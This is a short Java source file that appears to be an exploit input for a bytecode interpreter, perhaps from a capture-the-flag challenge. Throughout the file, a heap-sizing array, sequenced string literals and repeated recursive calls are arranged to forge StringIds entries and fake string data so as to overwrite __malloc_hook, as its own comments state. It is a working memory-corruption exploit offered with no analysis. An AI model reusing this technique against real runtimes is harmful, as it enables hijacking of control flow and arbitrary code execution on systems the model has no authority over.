
public class Min {
    public Min() {
        foo();
    }
    //public static void main(String[] args) {
    //}
    public static void foo() {
        int a[] = new int[(0xff-1-0x20)*0x1000/8-5];
        String x;
        x = "-167";  // patch the 2nd bytes to StringIds pointer, offset to StringIds, (0xb0-0x19)

        x = "22";   // Start of Fake StringIds inside Array, 0x70/4-6
        x = "23";   // 12 indexes to index fake StringId on-the-fly
        x = "24";
        x = "25";
        x = "26";
        x = "27";
        x = "28";
        x = "29";
        x = "30";
        x = "31";
        x = "32";
        x = "33";

        x = "34";   // 4 indexes to faked string index to patch __malloc_hook
        x = "35";
        x = "36";
        x = "37";

        x = "38";   // start of Fake string data, each new index string takes 10 digits + 1 byte len + 1 null byte
        x = "39";
        x = "40";
        x = "41";
        x = "42";
        x = "43";
        x = "44";
        x = "45";
        x = "46";
        x = "47";
        x = "48";
        x = "49";

        foo();
        foo();
        foo();
        foo();
        foo();
        foo();
        foo();
        foo();
        foo();
        foo();
        foo();
        foo();
        foo();
        foo();
        foo();
    }
}
